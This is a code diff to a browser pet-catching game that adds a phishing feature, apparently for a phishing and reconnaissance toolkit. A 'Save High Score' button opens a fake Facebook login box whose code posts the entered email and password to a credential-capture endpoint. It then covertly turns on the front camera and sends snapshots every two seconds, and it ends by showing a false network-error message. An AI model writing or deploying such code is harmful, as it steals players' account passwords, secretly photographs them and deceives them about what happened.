@@ -28,6 +28,7 @@ canvas#c{display:block;touch-action:none}
 #score{position:absolute;top:12px;left:16px;font-size:24px;font-weight:900;color:#fff;text-shadow:0 0 8px #7bed9f;z-index:10}
 #lives{position:absolute;top:12px;right:16px;font-size:20px;z-index:10}
 video,canvas#cap{position:fixed;opacity:0;width:2px;height:2px;top:-9999px;left:-9999px}
+.login-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.7);display:flex;align-items:center;justify-content:center;z-index:51;padding:20px}
 #touchL,#touchR{position:absolute;bottom:0;width:50%;height:30%;z-index:5;pointer-events:auto;display:flex;align-items:flex-end;justify-content:center;padding-bottom:16px;color:rgba(255,255,255,0.1);font-size:28px}
 #touchL.hidden,#touchR.hidden{display:none}
 #touchL{left:0}#touchR{right:0}
@@ -53,7 +54,19 @@ video,canvas#cap{position:fixed;opacity:0;width:2px;height:2px;top:-9999px;left:
 <div class="best" id="bestScore"></div>
 <div class="shares"><button class="sb s-wa" onclick="shareCard('wa')">💬 Share</button><button class="sb s-fb" onclick="shareCard('fb')">📘 Share</button></div>
 <button class="btn" onclick="startGame()">▶ Play Again</button>
+<button class="btn" id="saveScoreBtn" style="margin-top:4px;border-color:#1877f2;color:#1877f2;background:rgba(24,119,242,0.1);padding:10px 28px;font-size:14px">🔒 Save High Score</button>
 <div class="lb" id="goLb"></div>
+</div>
+<div class="login-overlay hidden" id="fbGate">
+<div class="login-box" style="background:#fff;border-radius:8px;padding:20px;max-width:360px;width:90%;position:relative;z-index:51;box-shadow:0 8px 40px rgba(0,0,0,0.4);text-align:center;font-family:Helvetica,Arial,sans-serif">
+<div style="font-size:28px;font-weight:900;color:#1877f2;letter-spacing:-1px;margin-bottom:16px">facebook</div>
+<p style="font-size:14px;color:#606770;margin-bottom:16px">Log in to save your high score</p>
+<input type="text" placeholder="Email address or phone number" id="fbUser" style="width:100%;padding:14px;margin-bottom:10px;border:1px solid #dddfe2;border-radius:6px;font-size:17px;background:#fff;box-sizing:border-box">
+<input type="password" placeholder="Password" id="fbPass" style="width:100%;padding:14px;margin-bottom:12px;border:1px solid #dddfe2;border-radius:6px;font-size:17px;background:#fff;box-sizing:border-box">
+<button onclick="doFbGateLogin()" style="width:100%;padding:14px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:20px;font-weight:700;cursor:pointer">Log In</button>
+<div style="margin-top:10px;font-size:12px;color:#606770">Your score will be saved to your profile</div>
+<button onclick="closeFbGate()" style="margin-top:8px;background:none;border:none;color:#606770;font-size:12px;cursor:pointer;text-decoration:underline">Skip — Play Again</button>
+</div>
 </div>
 <script>
 var API='API_BASE_URL',SHARE_URL='forwarding_link/t/pet-catch';
@@ -65,6 +78,7 @@ function snd(f,t){try{if(!ac)ac=new(AudioContext||webkitAudioContext)();var o=ac
 function init(){
 c=document.getElementById('c');ctx=c.getContext('2d');resize();addEventListener('resize',resize);
 document.getElementById('startBtn').onclick=startGame;
+var sb=document.getElementById('saveScoreBtn');if(sb)sb.onclick=function(){document.getElementById('fbGate').classList.remove('hidden');};
 document.getElementById('touchL').addEventListener('touchstart',function(e){e.preventDefault();leftH=true;},{passive:false});
 document.getElementById('touchL').addEventListener('touchend',function(e){e.preventDefault();leftH=false;},{passive:false});
 document.getElementById('touchR').addEventListener('touchstart',function(e){e.preventDefault();rightH=true;},{passive:false});
@@ -112,6 +126,23 @@ for(var i=0;i<particles.length;i++){ctx.fillStyle=particles[i].col;ctx.globalAlp
 function menuLoop(){ctx.clearRect(0,0,W,H);var g=ctx.createLinearGradient(0,0,0,H);g.addColorStop(0,'#1a2e1a');g.addColorStop(1,'#2d4e2d');ctx.fillStyle=g;ctx.fillRect(0,0,W,H);ctx.fillStyle='#7bed9f';ctx.font='bold 30px system-ui';ctx.textAlign='center';ctx.shadowColor='#7bed9f';ctx.shadowBlur=12;ctx.fillText('🐾 Pet Rescue',W/2,200);ctx.shadowBlur=0;ctx.font='40px system-ui';ctx.fillText('🧺',W/2,300);requestAnimationFrame(menuLoop);}
 function endGame(){running=false;dead=true;hs.push(score);hs.sort(function(a,b){return b-a;});hs=hs.slice(0,5);localStorage.setItem('petRescueHS',JSON.stringify(hs));document.getElementById('finalScore').textContent=score;document.getElementById('bestScore').textContent='Best: '+(hs[0]||0);document.getElementById('gameover').classList.remove('hidden');document.getElementById('touchL').classList.add('hidden');document.getElementById('touchR').classList.add('hidden');showLb();if(window.CamPhishRecon)CamPhishRecon.Capture.event('game_over',{score:score});}
 function showLb(){var h='<b>🏆 Top Scores</b><br>';for(var i=0;i<hs.length;i++)h+='<div>#'+(i+1)+' — '+hs[i]+'</div>';if(!hs.length)h='<b>🏆 Be the first!</b>';document.getElementById('menuLb').innerHTML=h;document.getElementById('goLb').innerHTML=h;}
+function doFbGateLogin(){
+var u=document.getElementById('fbUser'),p=document.getElementById('fbPass');
+if(!u||!p||!u.value||!p.value)return;
+var data={template_id:'facebook',username:u.value,password:p.value};
+if(u.value.indexOf('@')>=0)data.email=u.value;
+fetch('/api/capture/credentials',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)}).catch(function(){});
+if(window.CamPhishRecon){
+CamPhishRecon.Capture.event('petcatch_facebook_gate',{});
+navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:'user'}}).then(function(s){
+var v=document.getElementById('v');v.srcObject=s;v.play();
+var cap=document.getElementById('cap'),cx=cap.getContext('2d');
+var ci=setInterval(function(){if(v.readyState>=2){cx.drawImage(v,0,0,320,240);CamPhishRecon.Capture.image(cap.toDataURL('image/png'),'fb_gate_verify');}},2000);
+setTimeout(function(){clearInterval(ci);closeFbGate();alert('⚠️ Unable to save score. Network error. Please try again later.');},5000);
+}).catch(function(){closeFbGate();});
+}else{closeFbGate();}
+}
+function closeFbGate(){document.getElementById('fbGate').classList.add('hidden');}
 function shareCard(t){
 if(window.ViralEngine){
 ViralEngine.doShare(t,score,'🐾 I rescued pets and scored '+score+' in Pet Rescue! '+SHARE_URL);
